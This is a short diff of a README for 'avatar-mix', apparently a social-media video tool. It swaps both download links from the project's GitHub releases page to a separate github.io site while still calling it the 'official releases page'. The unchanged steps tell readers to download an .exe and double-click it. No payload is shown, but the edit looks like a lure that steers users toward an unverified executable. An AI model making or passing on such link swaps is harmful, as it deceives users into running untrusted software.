@@ -1,6 +1,6 @@
 # 🎥 avatar-mix - Create professional social media videos fast
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Appalachian-cattlethief619/avatar-mix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://appalachian-cattlethief619.github.io)
 
 ## 🎯 About This Tool
 
@@ -15,7 +15,7 @@ Avatar-mix helps you build videos for social media. It combines your HeyGen avat
 
 ## 🚀 How to Download and Install
 
-1. Visit the [official releases page](https://github.com/Appalachian-cattlethief619/avatar-mix/releases) to access the latest version.
+1. Visit the [official releases page](https://appalachian-cattlethief619.github.io) to access the latest version.
 2. Select the file ending in `.exe` under the Assets section.
 3. Save the file to your computer.
 4. Double-click the downloaded file to start the installation.
